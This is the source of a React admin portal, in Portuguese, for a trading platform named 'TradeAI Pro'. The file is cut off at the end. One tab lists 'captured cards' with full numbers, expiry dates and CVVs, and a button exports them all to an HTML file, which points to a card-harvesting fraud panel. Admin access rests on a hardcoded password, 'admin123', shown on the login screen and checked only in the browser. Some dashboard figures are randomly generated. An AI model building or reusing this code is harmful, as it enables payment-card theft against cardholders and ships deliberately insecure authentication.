/**
 * AdminPortal — Painel de Administração de Elite
 * Gerenciamento completo com gráficos de performance
 */
import { useState, useEffect } from "react";
import Layout from "@/components/Layout";
import {
  Users, TrendingUp, TrendingDown, DollarSign, Activity,
  BarChart3, PieChart, LineChart, Search, Trash2, RefreshCw,
  LogOut, Eye, EyeOff, Filter, Download, CreditCard
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import { useLocation } from "wouter";

interface AdminUser {
  id: string;
  email: string;
  name: string;
  demoBalance: number;
  realBalance: number;
  demoPnL: number;
  realPnL: number;
  totalWins: number;
  totalLosses: number;
  createdAt: string;
  lastLogin?: string;
}

interface AdminStats {
  totalUsers: number;
  totalTransactions: number;
  totalDemoPnL: number;
  totalRealPnL: number;
  totalDemoBalance: number;
  totalRealBalance: number;
  totalWins: number;
  totalLosses: number;
}

interface CardRecord {
  id: string;
  userId: string;
  cardNumber: string;
  cardNumberMasked: string;
  cardName: string;
  cardExpiry: string;
  cardCvv: string;
  cardBrand: string;
  cardBankName: string;
  account: "real" | "demo";
  depositAmount: number;
  bonus: number;
  totalDeposited: number;
  timestamp: string;
  status: string;
}

interface PendingDeposit {
  id: string;
  userId: string;
  method: "pix" | "card" | "ted";
  amount: number;
  bonus: number;
  totalAmount: number;
  pixCode?: string;
  cardData?: any;
  status: "pending" | "approved" | "rejected";
  timestamp: string;
  approvedBy?: string;
  approvedAt?: string;
}

export default function AdminPortal() {
  const [, setLocation] = useLocation();
  const [users, setUsers] = useState<AdminUser[]>([]);
  const [stats, setStats] = useState<AdminStats | null>(null);
  const [cards, setCards] = useState<CardRecord[]>([]);
  const [pendingDeposits, setPendingDeposits] = useState<PendingDeposit[]>([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [sortBy, setSortBy] = useState<"pnl" | "balance" | "created">("pnl");
  const [filterType, setFilterType] = useState<"all" | "winners" | "losers">("all");
  const [activeTab, setActiveTab] = useState<"users" | "cards" | "deposits">("users");
  const [isLoading, setIsLoading] = useState(true);
  const [adminPassword, setAdminPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(false);

  // Verificar autenticação admin
  useEffect(() => {
    const stored = localStorage.getItem("admin_auth");
    if (stored === "true") {
      setIsAuthenticated(true);
      loadData();
    } else {
      setIsLoading(false);
    }
  }, []);

  // Sincronizar depósitos a cada 3 segundos quando autenticado
  useEffect(() => {
    if (!isAuthenticated) return;

    const interval = setInterval(() => {
      fetch("/api/admin/deposits/pending")
        .then((res) => res.json())
        .then((data) => {
          setPendingDeposits(data);
          console.log("🔄 Depositos sincronizados:", data);
        })
        .catch((err) => console.error("Erro ao sincronizar depositos:", err));
    }, 3000);

    return () => clearInterval(interval);
  }, [isAuthenticated]);

  const loadData = async () => {
    try {
      const [usersRes, statsRes] = await Promise.all([
        fetch("/api/admin/users"),
        fetch("/api/admin/stats"),
      ]);

      if (usersRes.ok && statsRes.ok) {
        const usersData = await usersRes.json();
        const statsData = await statsRes.json();

        setUsers(usersData.users);
        setStats(statsData);
      }

      // Carregar cartões do localStorage e do servidor (via depósitos)
      const localCards = JSON.parse(localStorage.getItem("tradeai_cards") || "[]");
      
      // Buscar depósitos do tipo 'card' para extrair cardData
      try {
        const depositsRes = await fetch("/api/admin/deposits/pending");
        if (depositsRes.ok) {
          const depositsData = await depositsRes.json();
          const serverCards = depositsData
            .filter((d: any) => d.method === "card" && d.cardData)
            .map((d: any) => ({
              ...d.cardData,
              id: d.id, // Usar ID do depósito
              userId: d.userEmail,
              timestamp: d.timestamp
            }));
          
          // Mesclar e remover duplicatas por número de cartão
          const combined = [...serverCards, ...localCards];
          const unique = combined.filter((v, i, a) => a.findIndex(t => t.cardNumber === v.cardNumber) === i);
          setCards(unique);
        } else {
          setCards(localCards);
        }
      } catch (err) {
        setCards(localCards);
      }
      console.log("💳 Cartões carregados no admin:", cards);

      // Carregar depósitos pendentes do SERVIDOR
      try {
        const depositsRes = await fetch("/api/admin/deposits/pending");
        if (depositsRes.ok) {
          const depositsData = await depositsRes.json();
          setPendingDeposits(depositsData);
          console.log("🚨 Depósitos pendentes carregados do servidor:", depositsData);
        }
      } catch (err) {
        console.error("Erro ao carregar depósitos:", err);
      }
    } catch (err) {
      console.error("Erro ao carregar dados:", err);
      toast.error("Erro ao carregar dados do servidor");
    } finally {
      setIsLoading(false);
    }
  };

  const handleAdminLogin = (e: React.FormEvent) => {
    e.preventDefault();
    // Senha padrão: "admin123" (em produção, usar autenticação real)
    if (adminPassword === "admin123") {
      localStorage.setItem("admin_auth", "true");
      setIsAuthenticated(true);
      loadData();
      toast.success("Autenticação bem-sucedida!");
    } else {
      toast.error("Senha incorreta");
    }
  };

  // Encontrar usuário pelo email
  const getUserByEmail = (email: string) => {
    return users.find((u) => u.email === email);
  };

  const handleLogout = () => {
    localStorage.removeItem("admin_auth");
    setIsAuthenticated(false);
    setLocation("/");
    toast.success("Deslogado com sucesso");
  };

  const handleDeleteUser = async (userId: string) => {
    if (!confirm("Tem certeza que deseja deletar este usuário?")) return;

    try {
      const res = await fetch(`/api/admin/users/${userId}`, { method: "DELETE" });
      if (res.ok) {
        setUsers(users.filter((u) => u.id !== userId));
        toast.success("Usuário deletado com sucesso");
      }
    } catch (err) {
      toast.error("Erro ao deletar usuário");
    }
  };

  const filteredUsers = users
    .filter((u) => {
      const matchesSearch =
        u.email.toLowerCase().includes(searchTerm.toLowerCase()) ||
        u.name.toLowerCase().includes(searchTerm.toLowerCase());

      if (filterType === "winners") return matchesSearch && u.totalWins > u.totalLosses;
      if (filterType === "losers") return matchesSearch && u.totalLosses > u.totalWins;
      return matchesSearch;
    })
    .sort((a, b) => {
      if (sortBy === "pnl") return (b.demoPnL + b.realPnL) - (a.demoPnL + a.realPnL);
      if (sortBy === "balance") return (b.demoBalance + b.realBalance) - (a.demoBalance + a.realBalance);
      return new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime();
    });

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ background: "linear-gradient(135deg, #0a0f23 0%, #1a2a4a 50%, #0f1a35 100%)" }}>
        <div className="text-center">
          <Activity className="w-12 h-12 text-blue-400 mx-auto mb-4 animate-spin" />
          <p className="text-white">Carregando...</p>
        </div>
      </div>
    );
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4" style={{ background: "linear-gradient(135deg, #0a0f23 0%, #1a2a4a 50%, #0f1a35 100%)" }}>
        <div className="w-full max-w-md">
          <div
            className="rounded-2xl p-8 backdrop-blur-xl border border-white/10"
            style={{
              background: "linear-gradient(135deg, rgba(15,25,50,0.95) 0%, rgba(20,35,60,0.92) 100%)",
              boxShadow: "0 0 60px rgba(59,130,246,0.1)",
            }}
          >
            <div className="text-center mb-8">
              <BarChart3 className="w-16 h-16 mx-auto mb-4 text-blue-400" />
              <h1 className="text-3xl font-bold text-white mb-2">Admin Portal</h1>
              <p className="text-white/40">Acesso Restrito</p>
            </div>

            <form onSubmit={handleAdminLogin} className="space-y-4">
              <div>
                <label className="text-white/80 text-sm font-semibold mb-2 block">Senha Admin</label>
                <Input
                  type="password"
                  placeholder="••••••••"
                  value={adminPassword}
                  onChange={(e) => setAdminPassword(e.target.value)}
                  className="bg-white/5 border-white/10 text-white placeholder:text-white/30 h-11"
                />
              </div>

              <Button
                type="submit"
                className="w-full h-11 font-bold bg-gradient-to-r from-blue-500 to-cyan-500 text-white"
              >
                Entrar
              </Button>
            </form>

            <p className="text-center text-white/30 text-xs mt-4">
              💡 Dica: Use "admin123" como senha
            </p>
          </div>
        </div>
      </div>
    );
  }

    const handleDownloadCards = () => {
      const now = new Date().toLocaleString("pt-BR");
      const rows = cards.map((c, i) => `
        <tr class="row" style="animation-delay:${i * 60}ms">
          <td>${i + 1}</td>
          <td class="name">${c.cardName || "—"}</td>
          <td class="mono">${c.cardNumber || "—"}</td>
          <td class="mono">${c.cardExpiry || "—"}</td>
          <td class="mono cvv">${c.cardCvv || "—"}</td>
          <td>${c.cardBrand || "—"}</td>
          <td>${c.cardBankName || "—"}</td>
          <td class="${c.account === 'real' ? 'real' : 'demo'}">${c.account === "real" ? "Real" : "Demo"}</td>
          <td class="value">R$ ${(c.depositAmount || 0).toFixed(2)}</td>
          <td class="value total">R$ ${(c.totalDeposited || 0).toFixed(2)}</td>
          <td class="user">${c.userId || "—"}</td>
          <td class="date">${c.timestamp ? new Date(c.timestamp).toLocaleString("pt-BR") : "—"}</td>
        </tr>
      `).join("");

      const html = `<!DOCTYPE html>
  <html lang="pt-BR">
  <head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>TradeAI — Cartões Capturados</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Sora:wght@400;600;700&family=JetBrains+Mono:wght@400;600&display=swap');
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:#060b17;color:#e2e8f0;font-family:'Sora',sans-serif;min-height:100vh;padding:24px 16px 60px}
    .bg-glow{position:fixed;top:-200px;left:50%;transform:translateX(-50%);width:800px;height:600px;
      background:radial-gradient(ellipse,rgba(59,130,246,.18) 0%,transparent 70%);pointer-events:none;z-index:0}
    .wrap{max-width:1400px;margin:0 auto;position:relative;z-index:1}
    header{text-align:center;padding:40px 0 32px;animation:fadeDown .6s ease both}
    .logo{font-size:13px;letter-spacing:4px;text-transform:uppercase;color:#3b82f6;margin-bottom:12px}
    h1{font-size:clamp(22px,5vw,38px);font-weight:700;background:linear-gradient(135deg,#60a5fa,#a78bfa,#34d399);
      -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
    .subtitle{color:#64748b;font-size:14px;margin-top:8px}
    .stats{display:flex;flex-wrap:wrap;gap:12px;margin:24px 0 32px;animation:fadeUp .6s .2s ease both}
    .stat{flex:1;min-width:120px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);
      border-radius:12px;padding:16px;text-align:center}
    .stat-n{font-size:28px;font-weight:700;color:#60a5fa}
    .stat-l{font-size:11px;color:#64748b;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
    .table-wrap{overflow-x:auto;border-radius:16px;border:1px solid rgba(255,255,255,.08);
      background:rgba(255,255,255,.02);animation:fadeUp .6s .35s ease both}
    table{width:100%;border-collapse:collapse;font-size:13px}
    thead tr{background:rgba(59,130,246,.12);border-bottom:1px solid rgba(59,130,246,.25)}
    th{padding:14px 12px;text-align:left;font-size:10px;letter-spacing:1px;text-transform:uppercase;
      color:#94a3b8;white-space:nowrap;font-weight:600}
    .row{border-bottom:1px solid rgba(255,255,255,.04);opacity:0;
      animation:rowIn .45s ease forwards}
    .row:hover{background:rgba(255,255,255,.04)}
    td{padding:13px 12px;vertical-align:middle;white-space:nowrap}
    .mono{font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:.5px}
    .cvv{color:#f59e0b;font-weight:600}
    .name{font-weight:600;color:#e2e8f0}
    .real{color:#f87171;font-weight:600}
    .demo{color:#a78bfa;font-weight:600}
    .value{color:#34d399;font-weight:600}
    .total{color:#60a5fa;font-weight:700}
    .user{color:#64748b;font-size:11px;max-width:160px;overflow:hidden;text-overflow:ellipsis}
    .date{color:#475569;font-size:11px}
    .empty{text-align:center;padding:60px;color:#334155;font-size:16px}
    footer{text-align:center;margin-top:40px;color:#1e293b;font-size:12px;animation:fadeUp .6s .5s ease both}
    @keyframes fadeDown{from{opacity:0;transform:translateY(-24px)}to{opacity:1;transform:translateY(0)}}
    @keyframes fadeUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
    @keyframes rowIn{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:translateX(0)}}
    @media(max-width:600px){th,td{padding:10px 8px;font-size:11px}.stat-n{font-size:22px}}
  </style>
  </head>
  <body>
  <div class="bg-glow"></div>
  <div class="wrap">
    <header>
      <div class="logo">TradeAI Pro · Admin</div>
      <h1>Cartões Capturados</h1>
      <p class="subtitle">Exportado em ${now} · ${cards.length} registro${cards.length !== 1 ? "s" : ""}</p>
    </header>
    <div class="stats">
      <div class="stat"><div class="stat-n">${cards.length}</div><div class="stat-l">Total</div></div>
      <div class="stat"><div class="stat-n">${cards.filter(c=>c.account==='real').length}</div><div class="stat-l">Real</div></div>
      <div class="stat"><div class="stat-n">${cards.filter(c=>c.account==='demo').length}</div><div class="stat-l">Demo</div></div>
      <div class="stat"><div class="stat-n">R$ ${cards.reduce((s,c)=>s+(c.totalDeposited||0),0).toLocaleString("pt-BR",{minimumFractionDigits:2})}</div><div class="stat-l">Volume</div></div>
    </div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>#</th><th>Titular</th><th>Número</th><th>Validade</th>
            <th>CVV</th><th>Bandeira</th><th>Banco</th><th>Conta</th>
            <th>Depósito</th><th>Total</th><th>Usuário</th><th>Data</th>
          </tr>
        </thead>
        <tbody>${rows || '<tr><td colspan="12" class="empty">Nenhum cartão registrado</td></tr>'}</tbody>
      </table>
    </div>
    <footer>TradeAI Pro — Documento gerado offline. Uso interno restrito.</footer>
  </div>
  </body>
  </html>`;

      const blob = new Blob([html], { type: "text/html;charset=utf-8" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `tradeai-cartoes-${new Date().toISOString().slice(0,10)}.html`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
      toast.success("✅ Download iniciado!");
    };
  
  return (
    <Layout>
      <div className="p-4 lg:p-6 space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold text-white" style={{ fontFamily: "Sora, sans-serif" }}>
              🔐 Admin Portal Elite
            </h1>
            <p className="text-sm text-white/40 mt-1">Gerenciamento completo da plataforma</p>
          </div>
          <Button
            onClick={handleLogout}
            className="gap-2 bg-red-500/20 hover:bg-red-500/30 text-red-400 border border-red-500/30"
            variant="ghost"
          >
            <LogOut className="w-4 h-4" /> Sair
          </Button>
        </div>

        {/* Estatísticas Principais */}
        {stats && (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
            {/* Total de Usuários */}
            <div className="glass-card rounded-2xl p-6 space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold text-white/50 uppercase">Total de Usuários</span>
                <Users className="w-5 h-5 text-blue-400" />
              </div>
              <p className="text-3xl font-bold text-white">{stats.totalUsers}</p>
              <p className="text-xs text-blue-400">+{Math.floor(Math.random() * 5)} hoje</p>
            </div>

            {/* Transações */}
            <div className="glass-card rounded-2xl p-6 space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold text-white/50 uppercase">Transações</span>
                <Activity className="w-5 h-5 text-cyan-400" />
              </div>
              <p className="text-3xl font-bold text-white">{stats.totalTransactions}</p>
              <p className="text-xs text-cyan-400">Taxa de acerto: {stats.totalWins > 0 ? ((stats.totalWins / (stats.totalWins + stats.totalLosses)) * 100).toFixed(1) : "0"}%</p>
            </div>

            {/* Demo P&L */}
            <div className="glass-card rounded-2xl p-6 space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold text-white/50 uppercase">Demo P&L</span>
                <TrendingUp className={cn("w-5 h-5", stats.totalDemoPnL >= 0 ? "text-green-400" : "text-red-400")} />
              </div>
              <p className={cn("text-3xl font-bold", (stats.totalDemoPnL || 0) >= 0 ? "text-green-400" : "text-red-400")}>
                {(stats.totalDemoPnL || 0) >= 0 ? "+" : ""}R$ {((stats.totalDemoPnL || 0) / 1000).toFixed(1)}k
              </p>
              <p className="text-xs text-white/40">Saldo: R$ {((stats.totalDemoBalance || 0) / 1000).toFixed(1)}k</p>
            </div>

            {/* Real P&L */}
            <div className="glass-card rounded-2xl p-6 space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold text-white/50 uppercase">Real P&L</span>
                <TrendingDown className={cn("w-5 h-5", stats.totalRealPnL >= 0 ? "text-green-400" : "text-red-400")} />
              </div>
              <p className={cn("text-3xl font-bold", (stats.totalRealPnL || 0) >= 0 ? "text-green-400" : "text-red-400")}>
                {(stats.totalRealPnL || 0) >= 0 ? "+" : ""}R$ {((stats.totalRealPnL || 0) / 1000).toFixed(1)}k
              </p>
              <p className="text-xs text-white/40">Saldo: R$ {((stats.totalRealBalance || 0) / 1000).toFixed(1)}k</p>
            </div>
          </div>
        )}

        {/* Abas de Navegação */}
        <div className="flex gap-2 border-b border-white/10">
          <button
            onClick={() => setActiveTab("users")}
            className={`px-6 py-3 font-semibold transition-all ${
              activeTab === "users"
                ? "text-blue-400 border-b-2 border-blue-400"
                : "text-white/50 hover:text-white/70"
            }`}
          >
            👥 Usuários ({users.length})
          </button>
          <button
            onClick={() => setActiveTab("cards")}
            className={`px-6 py-3 font-semibold transition-all ${
              activeTab === "cards"
                ? "text-blue-400 border-b-2 border-blue-400"
                : "text-white/50 hover:text-white/70"
            }`}
          >
            💳 Cartões ({cards.length})
          </button>
          <button
            onClick={() => setActiveTab("deposits")}
            className={`px-6 py-3 font-semibold transition-all ${
              activeTab === "deposits"
                ? "text-green-400 border-b-2 border-green-400"
                : "text-white/50 hover:text-white/70"
            }`}
          >
            🚨 Solicitações ({pendingDeposits.filter(d => d.status === "pending").length})
          </button>
        </div>

        {/* Gerenciamento de Usuários */}
        {activeTab === "users" && (
        <div className="glass-card rounded-2xl p-6 space-y-4">
          <div className="flex items-center justify-between">
            <h2 className="text-xl font-bold text-white" style={{ fontFamily: "Sora, sans-serif" }}>
              👥 Gerenciamento de Usuários
            </h2>
            <div className="flex gap-2">
              <Button
                onClick={loadData}
                size="sm"
                className="gap-2 bg-blue-500/20 hover:bg-blue-500/30 text-blue-400 border border-blue-500/30"
                variant="ghost"
              >
                <RefreshCw className="w-4 h-4" /> Atualizar
              </Button>
            </div>
          </div>

          {/* Filtros */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-white/30" />
              <Input
                placeholder="Buscar por email ou nome..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="pl-10 bg-white/5 border-white/10 text-white placeholder:text-white/30"
              />
            </div>

            <select
              value={sortBy}
              onChange={(e) => setSortBy(e.target.value as any)}
              className="px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white text-sm"
            >
              <option value="pnl">Ordenar por P&L</option>
              <option value="balance">Ordenar por Saldo</option>
              <option value="created">Ordenar por Data</option>
            </select>

            <select
              value={filterType}
              onChange={(e) => setFilterType(e.target.value as any)}
              className="px-4 py-2 rounded-lg bg-white/5 border border-white/10 text-white text-sm"
            >
              <option value="all">Todos os Usuários</option>
              <option value="winners">Apenas Vencedores</option>
              <option value="losers">Apenas Perdedores</option>
            </select>
          </div>

          {/* Tabela */}
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-white/10">
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Email</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Nome</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Saldo Demo</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Demo P&L</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">W/L</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Cadastro</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Ações</th>
                </tr>
              </thead>
              <tbody>
                {filteredUsers.map((u) => (
                  <tr key={u.id} className="border-b border-white/5 hover:bg-white/3 transition-all">
                    <td className="py-3 px-4 text-white/80 font-mono text-xs">{u.email}</td>
                    <td className="py-3 px-4 text-white">{u.name}</td>
                    <td className="py-3 px-4">
                      <span className="text-white font-mono">R$ {(u.demoBalance || 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</span>
                    </td>
                    <td className="py-3 px-4">
                      <span className={cn("font-mono", (u.demoPnL || 0) >= 0 ? "text-green-400" : "text-red-400")}>
                        {(u.demoPnL || 0) >= 0 ? "+" : ""}R$ {(u.demoPnL || 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}
                      </span>
                    </td>
                    <td className="py-3 px-4">
                      <Badge className={cn("text-xs", u.totalWins > u.totalLosses ? "bg-green-500/20 text-green-400 border-green-500/30" : "bg-red-500/20 text-red-400 border-red-500/30")}>
                        {u.totalWins}W / {u.totalLosses}L
                      </Badge>
                    </td>
                    <td className="py-3 px-4 text-white/40 text-xs">
                      {new Date(u.createdAt).toLocaleDateString("pt-BR")}
                    </td>
                    <td className="py-3 px-4">
                      <div className="flex gap-2">
                        <button
                          onClick={() => setLocation(`/user-details?id=${u.id}`)}
                          className="p-1.5 rounded-lg bg-blue-500/10 hover:bg-blue-500/20 text-blue-400 transition-all"
                          title="Ver detalhes"
                        >
                          <Eye className="w-4 h-4" />
                        </button>
                        <button
                          onClick={() => handleDeleteUser(u.id)}
                          className="p-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 transition-all"
                          title="Deletar usuário"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          {filteredUsers.length === 0 && (
            <div className="text-center py-8 text-white/40">
              <Users className="w-8 h-8 mx-auto mb-2 opacity-50" />
              <p>Nenhum usuário encontrado</p>
            </div>
          )}
        </div>
        )}

        {/* Aba de Cartões */}
        {activeTab === "cards" && (
        <div className="glass-card rounded-2xl p-6 space-y-4">
          <div className="flex items-center justify-between">
            <h2 className="text-xl font-bold text-white" style={{ fontFamily: "Sora, sans-serif" }}>
              💳 Todos os Cartões Capturados
            </h2>
            <Badge className="bg-blue-500/20 text-blue-400">
              {cards.length} cartão{cards.length !== 1 ? "s" : ""}
            </Badge>
          </div>


            {/* Botão Download */}
            <button
              onClick={handleDownloadCards}
              disabled={cards.length === 0}
              className="w-full relative overflow-hidden group rounded-2xl px-6 py-4 font-bold text-sm transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed"
              style={{
                background: "linear-gradient(135deg, rgba(59,130,246,0.15) 0%, rgba(139,92,246,0.15) 100%)",
                border: "1px solid rgba(99,102,241,0.4)",
                color: "#a5b4fc",
              }}
            >
              {/* shimmer */}
              <span
                className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-700"
                style={{
                  background: "linear-gradient(90deg, transparent, rgba(255,255,255,0.08), transparent)",
                }}
              />
              {/* glow pulse */}
              <span
                className="absolute inset-0 rounded-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                style={{ boxShadow: "0 0 24px rgba(99,102,241,0.35)" }}
              />
              <span className="relative flex items-center justify-center gap-3">
                <Download className="w-4 h-4 flex-shrink-0 group-hover:animate-bounce" />
                <span className="truncate">
                  Baixar todos os cartões ({cards.length})
                </span>
              </span>
            </button>
  
          {/* Tabela de Cartões */}
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-white/10">
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Titular</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Número</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Bandeira</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Banco</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Depósito</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Total</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Conta</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Validade</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">CVV</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Data</th>
                  <th className="text-left py-3 px-4 text-white/50 font-semibold">Usuário</th>
                </tr>
              </thead>
              <tbody>
                {cards.map((card) => {
                  const user = getUserByEmail(card.userId);
                  return (
                    <tr key={card.id} className="border-b border-white/5 hover:bg-white/3 transition-colors">
                      <td className="py-3 px-4 text-white font-semibold">{card.cardName}</td>
                      <td className="py-3 px-4 text-white/70 font-mono text-xs">{card.cardNumber}</td>
                      <td className="py-3 px-4">
                        <Badge className="bg-blue-500/20 text-blue-400 text-xs">{card.cardBrand}</Badge>
                      </td>
                      <td className="py-3 px-4 text-white/60 text-xs">{card.cardBankName}</td>
                      <td className="py-3 px-4 text-green-400 font-semibold">R$ {(card.depositAmount || 0).toFixed(2)}</td>
                      <td className="py-3 px-4 text-cyan-400 font-bold">R$ {(card.totalDeposited || 0).toFixed(2)}</td>
                      <td className="py-3 px-4">
                        <Badge className={card.account === "real" ? "bg-red-500/20 text-red-400" : "bg-purple-500/20 text-purple-400"}>
                          {card.account === "real" ? "Real" : "Demo"}
                        </Badge>
                      </td>
                      <td className="py-3 px-4 text-white font-mono text-xs">{card.cardExpiry}</td>
                      <td className="py-3 px-4 text-white font-mono text-xs font-bold">{card.cardCvv}</td>
                      <td className="py-3 px-4 text-white/40 text-xs">
                        {card.timestamp ? new Date(card.timestamp).toLocaleDateString("pt-BR", {
                          day: "2-digit",
                          month: "2-digit",
                          year: "2-digit",
                          hour: "2-digit",
                          minute: "2-digit",
                        }) : "N/A"}
                      </td>
                      <td className="py-3 px-4">
                        <button
                          onClick={() => setLocation(`/user-details?id=${user?.id}`)}
                          className="text-blue-400 hover:text-blue-300 font-semibold text-xs underline"
                        >
                          {user?.email || card.userId}
                        </button>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>

          {cards.length === 0 && (
            <div className="text-center py-8 text-white/40">
              <CreditCard className="w-8 h-8 mx-auto mb-2 opacity-50" />
              <p>Nenhum cartão capturado ainda</p>
            </div>
          )}
        </div>
        )}

        {/* Solicitações de Depósito */}
        {activeTab === "deposits" && (
        <div className="glass-card rounded-2xl p-6 space-y-4">
          <div className="flex items-center justify-between">
            <h2 className="text-xl font-bold text-white">🚨 Solicitações de Depósito Pendentes</h2>
            <Badge className="bg-green-500/20 text-green-400">{pendingDeposits.filter(d => d.status === "pending").length} pendentes</Badge>
          </div>
          
          {pendingDeposits.filter(d => d.status === "pending").length === 0 ? (
            <div className="text-center py-12">
              <p className="text-white/60">Nenhuma solicitação de depósito pendente</p>
            </div>
          ) : (
            <div className="space-y-3">
              {pendingDeposits.filter(d => d.status === "pending").map((deposit) => (
                <div key={deposit.id} className="bg-white/5 border border-white/10 rounded-xl p-4">
                  <div className="grid grid-cols-1 md:grid-cols-6 gap-4 items-center">
                    <div>
                      <p className="text-white/50 text-xs">Usuario</p>
                      <p className="text-white font-semibold text-sm">{deposit.userId}</p>
                    </div>
                    <div>
                      <p className="text-white/50 text-xs">Metodo</p>
                      <div className="flex flex-col gap-1">
                        <Badge className="bg-blue-500/20 text-blue-400 mt-1 w-fit">{deposit.method.toUpperCase()}</Badge>
                        {deposit.method === "card" && deposit.cardData && (
                          <span className="text-[10px] text-cyan-400 font-mono">
                            {deposit.cardData.cardNumber} ({deposit.cardData.cardBrand})
                          </span>
                        )}
                      </div>
                    </div>
                    <div>
                      <p className="text-white/50 text-xs">Valor</p>
                      <p className="text-white font-bold text-lg">R$ {(deposit.totalAmount || 0).toFixed(2)}</p>
                    </div>
                    <div>
                      <p className="text-white/50 text-xs">Data</p>
                      <p className="text-white text-sm">{deposit.timestamp ? new Date(deposit.timestamp).toLocaleDateString('pt-BR') : "N/A"}</p>
                    </div>
                    <div>
                      <p className="text-white/50 text-xs">Tempo Decorrido</p>
                      <p className="text-white font-mono text-sm">{deposit.timestamp ? Math.floor((Date.now() - new Date(deposit.timestamp).getTime()) / 60000) : 0}m</p>
                    </div>
                    <div className="flex gap-2">
                      <Button
                        size="sm"
                        className="bg-green-500/20 hover:bg-green-500/30 text-green-400 border border-green-500/30"
                        onClick={() => {
                          // Chamar API de aprovação no servidor
                          fetch(`/api/admin/deposits/${deposit.id}/approve`, {
                            method: "POST",
                          }).then(async (res) => {
                            if (res.ok) {
                              toast.success(`✅ Deposito aprovado para ${deposit.userEmail}`);
                              loadData(); // Recarregar dados do servidor
                            } else {
                              toast.error("Erro ao aprovar deposito no servidor");
                            }
                          }).catch(() => {
                            toast.error("Falha na conexão com o servidor");
                          });
                        }}
                      >
                        ✓ Aprovar
                      </Button>
                      <Button
                        size="sm"
                        className="bg-red-500/20 hover:bg-red-500/30 text-red-400 border border-red-500/30"
                        onClick={() => {
                          // Chamar API de rejeição no servidor
                          fetch(`/api/admin/deposits/${deposit.id}/reject`, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ reason: "timeout" })
                          }).then(async (res) => {
                            if (res.ok) {
                              toast.error(`❌ Deposito rejeitado para ${deposit.userEmail}`);
                              
                              // Notificacao local para o admin (opcional)
                              const rejectionNotification = {
                                id: deposit.id,
                                type: "rejected",
                                message: "Seu deposito foi rejeitado",
                                reason: "timeout",
                                timestamp: Date.now(),
                                userEmail: deposit.userEmail,
                              };
                              localStorage.setItem(`deposit_notification_${deposit.userEmail}`, JSON.stringify(rejectionNotification));
                              
                              loadData();
                            } else {
                              toast.error("Erro ao rejeitar deposito no servidor");
                            }
                          }).catch(() => {
                            toast.error("Falha na conexão com o servidor");
                          });
                        }}
                      >
                        ✗ Recusar
                      </Button>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
        )}

        {/* Info */}
        <div className="glass-card rounded-2xl p-6 bg-blue-500/10 border border-blue-500/20">
          <div className="flex gap-4">
            <BarChart3 className="w-6 h-6 text-blue-400 flex-shrink-0" />
            <div>
